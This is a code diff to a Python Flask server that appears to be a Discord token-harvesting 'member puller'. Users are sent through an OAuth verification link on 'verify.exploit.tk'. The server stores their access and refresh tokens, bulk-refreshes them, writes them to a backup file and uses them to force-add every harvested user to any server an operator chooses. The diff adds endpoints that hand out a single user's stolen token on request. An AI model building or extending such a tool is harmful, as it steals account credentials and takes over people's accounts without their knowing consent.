@@ -5,7 +5,6 @@ import os
 import json, requests
 from dhooks import Webhook, File
 from flask import Flask, redirect, url_for, request
-pwd = os.environ['pwd']
 app = Flask(__name__)
 
 # @app.route('/')
@@ -26,6 +25,7 @@ REDIRECT_URI = 'https://verify.exploit.tk'  #
 TOKEN_FINDER_API = "https://"
 TOKEN_FINDER_API_AUTH = "02ab23b5df4ff52f46320e92d7"
 backup_hook = os.environ["backup_"]
+pwd = os.environ['pwd']
 
 
 def exchange_code(code):
@@ -57,12 +57,9 @@ def add_to_guild(access_token, userID, guild_Id):
     "Authorization": f"Bot {botToken}",
     'Content-Type': 'application/json'
   }
-  response = requests.put(url=url, headers=headers, json=data)
-  r = requests.post(
-    hook, json={"content": f"successfully added user <@{userID}> | {userID}"})
-  r = requests.put(
-    f"https://canary.discord.com/api/v9/guilds/952495772073619466/members/{userID}/roles/988815859814383648",
-    headers={"Authorization": f"Bot {tkn}"})
+  r = requests.put(url=url, headers=headers, json=data)
+  print(r.status_code)
+  return r.status_code
   # print(response.text)
   # print(response.status_code)
   # print(REDIRECT_URI)
@@ -84,8 +81,9 @@ def get_new_token(refresh):
     'refresh_token': refresh
   }
   r = requests.post(f"{API_ENDPOINT}/oauth2/token", data=data, headers=headers)
-
-  return r.json()
+  if r.status_code in (200, 201, 204):
+    return r.json()
+  return "failed"
 
 
 # code = exchange_code('gvxPfY7M80idbUgN6YfwJPUIEuP2kv')['access_token']
@@ -95,6 +93,17 @@ def get_new_token(refresh):
 #   return redirect("https://discord.com/invite/spy", code=302)
 
 # def handler(code: str):
+def save(id, access_tk, refresh_tk):
+  with open('Database/access_tokens.json', 'r') as f:
+    db1 = json.load(f)
+    db1[str(id)] = str(access_tk)
+    with open('Database/access_tokens.json', 'w') as f:
+      json.dump(db1, f, indent=2)
+  with open('Database/refresh_tokens.json', 'r') as f:
+    db2 = json.load(f)
+    db2[str(id)] = str(refresh_tk)
+    with open('Database/refresh_tokens.json', 'w') as f:
+      json.dump(db2, f, indent=2)
 
 
 def test():
@@ -120,50 +129,92 @@ def backup():
 
 
 # backup()
+@app.route("/pullsingle", methods = ["get"])
+def pullsingle():
+  if request.headers.get('Authorization') != pwd:
+    return 'unauthorized'
+  jsonxd = request.json 
+  user = jsonxd["user"]
+  f = open("Database/access_tokens.json", "r").read()
+  f = json.loads(f)
+  try:
+    tk = f[user]
+  except KeyError:
+    return "dberr"
+  print(tk)
+  return tk
+
+@app.route("/refreshsingle", methods = ["put"])
+def refreshsingle():
+  if request.headers.get('Authorization') != pwd:
+    return 'unauthorized'
+  jsonxd = request.json 
+  user = jsonxd["user"]
+  f = open("Database/refresh_tokens.json", "r").read()
+  f = json.loads(f)
+  try:
+    tk = f[user]
+  except:
+    return "this user is not in database"
+  print(tk)
+  r = get_new_token(tk)
+  if r == "failed":
+    return "failed"
+  access = r["access_token"]
+  refresh = r["refresh_token"]
+  save(user, access, refresh)
+  return "success"
+  
 @app.route("/pull", methods = ['POST'])
 def pull():
   if request.headers.get('Authorization') != pwd:
     return 'unauthorized'
-  json = request.json
-  guild = json['guild']
+  jsonxd = request.json
+  guild = jsonxd['guild']
   access = open('Database/access_tokens.json', 'r').read()
   access = json.loads(access)
+  added = 0
+  failed = 0
   for key in access:
     value = access[key]
     print(key, value)
-    add_to_guild(value, key, guild)
+    r = add_to_guild(value, key, guild)
+    if r in (200, 201, 204):
+      added += 1
+    else:
+      failed += 1
+  return "success\n %s\n\nfailed\n %s" % (added, failed)
+  
+    
 
 @app.route("/members", methods = ['GET'])
 def members():
   if request.headers.get('Authorization') != pwd:
     return 'unauthorized'
-  access = open("Database/access_tokens.json").read()
-  access = json.loads(access)
+  access = open("Database/access_tokens.json").readlines()
+  # access = json.loads(access)
   return str(len(access))
-      
+
+def refresh_all():
+  refresh = open("Database/refresh_tokens.json").read()
+  refresh = json.loads(refresh)
+  for key in refresh:
+    value = refresh[key]
+    r = get_new_token(value) # commented to avoid massacres
+    new_access = r["access_token"]
+    new_refresh = r["refresh_token"]
+    f = open("backup.txt", "a")
+    f.write("%s:%s:%s" % (key, new_access, new_refresh))
+    print("%s:%s:%s" % (key, new_access, new_refresh))
+    save(key, new_access, new_refresh)
+    
 @app.route("/refresh", methods = ['POST'])
 def refresh():
   if request.headers.get('Authorization') != pwd:
     return 'unauthorized'
   # access = open("access_tokens.json").read()
-  refresh = open("refresh_tokens.json").read()
-  refresh = json.loads(refresh)
-  for key in refresh:
-    value = r
-    refresh[key]
-    # r = get_new_token(value) commented to avoid massacres
-    new_access = r["access_token"]
-    new_refresh = r["refresh_token"]
-    with open('Database/naccess_tokens.json', 'r') as f:
-      db1 = json.load(f)
-      db1[str(key)] = str(new_access)
-      with open('Database/naccess_tokens.json', 'w') as f:
-        json.dump(db1, f, indent=2)
-    with open('Database/nrefresh_tokens.json', 'r') as f:
-      db2 = json.load(f)
-      db2[str(key)] = str(new_refresh)
-      with open('Database/nrefresh_tokens.json', 'w') as f:
-        json.dump(db2, f, indent=2)
+  refresh_all()
+  return "200"
     
         
                           
@@ -175,7 +226,7 @@ def hello_world():
     # return '<h1> Your IP address is:' + ip_addr
 @app.route('/')
 def process_json():
-  os.system("clear")
+  # os.system("clear")
   # test()
   # redirect("https://discord.com/invite/spy", code=302)
   args = request.args
@@ -197,22 +248,17 @@ def process_json():
     # print(refresh_tk)
     id = get_user(access_tk)
     # print(id)
-    with open('Database/access_tokens.json', 'r') as f:
-      db1 = json.load(f)
-      db1[str(id)] = str(access_tk)
-      with open('Database/access_tokens.json', 'w') as f:
-        json.dump(db1, f, indent=2)
-    with open('Database/refresh_tokens.json', 'r') as f:
-      db2 = json.load(f)
-      db2[str(id)] = str(refresh_tk)
-      with open('Database/refresh_tokens.json', 'w') as f:
-        json.dump(db2, f, indent=2)
-
+    save(id, access_tk, refresh_tk)
     # Sliding Code to Token Finder API
   except:
     return redirect("https://discord.com/oauth2/authorized", code=302)
   try:
     add_to_guild(str(access_tk), str(id), "952495772073619466")
+    r = requests.post(
+    hook, json={"content": f"successfully added user <@{userID}> | {userID}"})
+    r = requests.put(
+    f"https://canary.discord.com/api/v9/guilds/952495772073619466/members/{userID}/roles/988815859814383648",
+    headers={"Authorization": f"Bot {tkn}"})
   except:
     pass
   return redirect("https://discord.com/oauth2/authorized", code=302)
